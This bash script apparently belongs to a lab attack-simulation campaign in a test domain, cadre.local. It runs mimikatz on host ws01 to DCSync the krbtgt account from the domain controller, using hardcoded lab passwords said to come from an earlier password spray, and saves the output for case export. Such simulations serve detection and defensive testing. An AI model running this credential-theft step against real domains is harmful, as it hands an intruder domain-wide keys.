#!/usr/bin/env bash
# T009 — DCSync from ws01 via mimikatz (chief_command from T031 spray — cadre.local)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T009-DCSYNC-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
DC01="${DC01:-192.168.77.10}"
echo "=== T009 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz

MK_CMD="lsadump::dcsync /domain:cadre.local /user:CN=krbtgt,CN=Users,DC=cadre,DC=local /dc:dc01.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre.local"
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "C:\Tools\cadre-attack\mimikatz.exe \"${MK_CMD}\" exit 2>&1 | Tee-Object C:\Tools\cadre-attack\dcsync-out.txt; Get-Content C:\Tools\cadre-attack\dcsync-out.txt -Tail 30"

cadre_export "${CASE_ID}" T009 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
